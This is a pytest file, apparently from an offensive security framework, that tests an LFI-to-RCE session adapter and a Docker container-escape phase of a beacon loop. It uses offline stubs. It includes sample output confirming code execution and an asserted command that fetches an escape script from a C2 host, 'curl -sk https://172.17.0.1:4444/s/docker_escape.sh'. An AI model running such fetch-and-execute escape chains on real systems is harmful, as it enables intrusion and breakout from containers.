"""tests/test_php2shell_rce.py

Tests for the php2shell HTTP RCE session adapter and the beacon-loop
docker-escape phase.

Offline: the adapter tests inject the exploit stdout (the parser is
pure), the missing-script path and the handoff fallback resolution are
exercised with stubs, and the docker-escape ladder runs on synthetic
beacon history records. No network access and no exploit run happen.
"""

from __future__ import annotations

from pathlib import Path

import pytest

import modules.php2shell_rce as pr
from modules.beacon_loop import (
    DOCKER_CAPS_PROBE,
    DOCKER_SOCK_PROBE,
    ESCAPE_RUN_COMMAND,
    docker_escape_plan,
    heuristic_plan,
)
from modules.lazy_handoff import POST_FOOTHOLD_GOAL

RCE_STDOUT = """[*] Target: http://172.17.0.2:80
[*] Command: id

[attempt 1] SID=exploit926a72f0de3f45a6bebb file=/tmp/sessions/sess_exploit926a72f0de3f45a6bebb
    plant=HTTP/1.1 200 OK
[+] RCE CONFIRMED: ___START___
uid=33(www-data) gid=33(www-data) groups=33(www-data)
___END___
"""

FAILED_STDOUT = """[attempt 1] SID=exploit1 file=/tmp/sessions/sess_exploit1
    plant=HTTP/1.1 200 OK
    lfi=HTTP/1.1 200 OK body=b'<br />Warning: include(...): failed'
[-] RCE not confirmed - LFI path/session path or timing is wrong
"""


class TestExtractOutput:
    def test_confirmed_tail_is_captured(self):
        assert "uid=33(www-data)" in pr._extract_output(RCE_STDOUT)

    def test_script_markers_are_stripped(self):
        output = pr._extract_output(RCE_STDOUT)
        assert "___START___" not in output
        assert "___END___" not in output

    def test_failed_run_is_empty(self):
        assert pr._extract_output(FAILED_STDOUT) == ""

    def test_empty_input_is_empty(self):
        assert pr._extract_output("") == ""
        assert pr._extract_output(None) == ""


class TestPhp2ShellSession:
    def test_run_returns_empty_without_the_poc_script(self, monkeypatch, tmp_path):
        monkeypatch.setattr(pr, "ensure_installed", lambda: None)
        monkeypatch.setattr(pr, "BASE_DIR", tmp_path)
        session = pr.Php2ShellSession("127.0.0.1", 80)
        assert session.run("id") == ""

    def test_run_uses_resolved_coordinates(self, monkeypatch, tmp_path):
        captured: dict[str, str] = {}

        class FakeResult:
            returncode = 0
            stdout = RCE_STDOUT
            stderr = ""

        def fake_shell(command, allow, reason, timeout, cwd):
            captured["command"] = command
            return FakeResult()

        monkeypatch.setattr(pr, "ensure_installed", lambda: tmp_path / "chain_a.py")
        monkeypatch.setattr(pr, "safe_run_shell", fake_shell)
        session = pr.Php2ShellSession("10.0.0.5", 8080, session_path="/tmp")
        output = session.run("id")
        assert "uid=33" in output
        assert "--target http://10.0.0.5:8080" in captured["command"]
        assert "--session-path /tmp" in captured["command"]

    def test_alive_requires_nonce_echo(self, monkeypatch, tmp_path):
        monkeypatch.setattr(pr, "ensure_installed", lambda: tmp_path / "chain_a.py")

        def echo_nonce(command, allow, reason, timeout, cwd):
            nonce = command.split("--command 'echo ")[1].split("'")[0]

            class FakeResult:
                returncode = 0
                stdout = f"[+] RCE CONFIRMED: ___START___\n{nonce}\n___END___\n"
                stderr = ""

            return FakeResult()

        monkeypatch.setattr(pr, "safe_run_shell", echo_nonce)
        session = pr.Php2ShellSession("127.0.0.1", 80)
        assert session.alive() is True


class TestSessionForTarget:
    def test_lab_container_resolves_port_80(self, monkeypatch):
        import modules.loop_preflight as preflight

        monkeypatch.setattr(
            preflight,
            "lab_state_for",
            lambda target: {"scenario": "php2shell56", "container": "lazyown-lab-php2shell56", "ip": "172.17.0.9", "running": True},
        )
        confirmed: list[str] = []
        monkeypatch.setattr(pr, "confirm_outcome", lambda host, output="", task_id="": confirmed.append(host) or True)
        monkeypatch.setattr(pr.Php2ShellSession, "alive", lambda self, timeout=15: True)
        session = pr.session_for_target("172.17.0.9", payload={})
        assert session is not None
        assert (session.host, session.port) == ("172.17.0.9", 80)
        assert confirmed == ["172.17.0.9"]

    def test_payload_url_resolves_host_and_port(self, monkeypatch):
        monkeypatch.setattr(pr, "_lab_target", lambda target: None)
        confirmed: list[str] = []
        monkeypatch.setattr(pr, "confirm_outcome", lambda host, output="", task_id="": confirmed.append(host) or True)
        monkeypatch.setattr(pr.Php2ShellSession, "alive", lambda self, timeout=15: False)
        session = pr.session_for_target("10.10.10.10", payload={"url": "http://10.10.10.10:9000/index.php"})
        assert session is None

    def test_dead_target_returns_none(self, monkeypatch):
        monkeypatch.setattr(pr, "_lab_target", lambda target: None)
        session = pr.session_for_target("10.10.10.10", payload={"rhost": "10.10.10.10", "rport": 80})
        assert session is None


class TestConfirmOutcome:
    def test_publishes_once_per_host(self, monkeypatch):
        monkeypatch.delitem(pr._CONFIRMED_HOSTS, "1.2.3.4", raising=False)
        events: list[dict] = []

        def fake_record(**kwargs):
            events.append(kwargs)
            return {}

        import modules.outcome_bus as bus

        monkeypatch.setattr(bus, "record_event", fake_record)
        assert pr.confirm_outcome("1.2.3.4") is True
        assert pr.confirm_outcome("1.2.3.4") is False
        assert len(events) == 1
        assert events[0]["shell"] is True
        assert events[0]["source"] == "php2shell_session"
        assert "CVE-2026-109618" in events[0]["cve"]


class TestDockerEscapePlan:
    def _records(self, sock_output: str, extra: list[dict] | None = None) -> list[dict]:
        records = [
            {"command": DOCKER_SOCK_PROBE, "output": sock_output},
            {"command": DOCKER_CAPS_PROBE, "output": "CapEff: 0000003fffffffff"},
        ]
        return records + (extra or [])

    def test_probes_first(self, tmp_path):
        plan = docker_escape_plan("docker escape", "linux", [], sessions_dir=tmp_path)
        assert plan == [DOCKER_SOCK_PROBE, DOCKER_CAPS_PROBE]

    def test_escape_when_socket_present(self, monkeypatch, tmp_path):
        import core.config as config

        monkeypatch.setattr(config, "load_payload", lambda: {"lhost": "172.17.0.1", "c2_port": "4444"})
        records = self._records("srwxr-xr-x 1 root root 0 /var/run/docker.sock")
        plan = docker_escape_plan("docker escape", "linux", records, sessions_dir=tmp_path)
        assert any("curl -sk https://172.17.0.1:4444/s/docker_escape.sh" in c for c in plan)
        assert plan[-1] == ESCAPE_RUN_COMMAND

    def test_stage_tracks_source_updates(self, monkeypatch, tmp_path):
        from modules import beacon_loop as bl

        stale = tmp_path / bl.ESCAPE_SCRIPT_NAME
        stale.write_text("# stale", encoding="utf-8")
        assert bl._stage_escape_script(tmp_path) is True
        assert "HostConfig" in stale.read_text(encoding="utf-8")

    def test_no_socket_ends_the_phase(self, tmp_path):
        records = self._records("ls: cannot access /var/run/docker.sock: No such file or directory")
        assert docker_escape_plan("docker escape", "linux", records, sessions_dir=tmp_path) == []

    def test_already_ran_is_skipped(self, monkeypatch, tmp_path):
        records = self._records(
            "srwxr-xr-x 1 root root 0 /var/run/docker.sock",
            extra=[{"command": ESCAPE_RUN_COMMAND, "output": "proof"}],
        )
        assert docker_escape_plan("docker escape", "linux", records, sessions_dir=tmp_path) == []

    def test_windows_and_default_goal_never_escape(self, tmp_path):
        assert docker_escape_plan("docker escape", "windows", [], sessions_dir=tmp_path) == []
        assert docker_escape_plan(POST_FOOTHOLD_GOAL, "linux", [], sessions_dir=tmp_path) == []

    def test_payload_flag_arms_the_phase(self, monkeypatch, tmp_path):
        import core.config as config

        monkeypatch.setattr(config, "load_payload", lambda: {"beacon_docker_escape": True})
        plan = docker_escape_plan(POST_FOOTHOLD_GOAL, "linux", [], sessions_dir=tmp_path)
        assert DOCKER_SOCK_PROBE in plan

    def test_heuristic_plan_includes_escape_probes(self, monkeypatch, tmp_path):
        import core.config as config

        monkeypatch.setattr(config, "load_payload", lambda: {"beacon_docker_escape": True})
        plan = heuristic_plan(POST_FOOTHOLD_GOAL, "linux", [], sessions_dir=tmp_path)
        assert any(DOCKER_SOCK_PROBE in command for command in plan)


class TestHandoffFallback:
    def test_worker_falls_back_to_php2shell_session(self, monkeypatch, tmp_path):
        import modules.lazy_handoff as handoff

        events: list[str] = []

        class FakeBridge:
            @staticmethod
            def open_shell(target, lhost="127.0.0.1"):
                return None

        class FakeSession:
            host = "172.17.0.9"
            port = 80

        class FakeDelivery:
            @staticmethod
            def deploy_client(client, target, wait=0, session=None):
                events.append(f"session={type(session).__name__}")
                return {"success": False, "client_id": "", "reason": "test-stub"}

        class FakeLoop:
            @staticmethod
            def run_beacon_loop(config, log=print, sessions_dir=None):
                class R:
                    verdict = "aborted"
                    commands_queued: list[str] = []

                return R()

            @staticmethod
            def write_report(report, sessions_dir=None):
                return None

        monkeypatch.setattr("modules.atomic_exploit_bridge.open_shell", FakeBridge.open_shell)
        monkeypatch.setattr(
            handoff,
            "_php2shell_session_for",
            lambda target, payload=None: FakeSession(),
        )
        monkeypatch.setattr("modules.bof_delivery.deploy_client", FakeDelivery.deploy_client)
        monkeypatch.setattr("modules.beacon_loop.run_beacon_loop", FakeLoop.run_beacon_loop)
        monkeypatch.setattr("modules.beacon_loop.write_report", FakeLoop.write_report)

        def fake_tlog(line: str) -> None:
            events.append(line)

        handoff._handoff_worker(
            "172.17.0.9", "test", fake_tlog, tmp_path, 1.0, 1
        )
        assert any("session=FakeSession" in e for e in events)
        assert any("php2shell HTTP RCE session confirmed" in e for e in events)
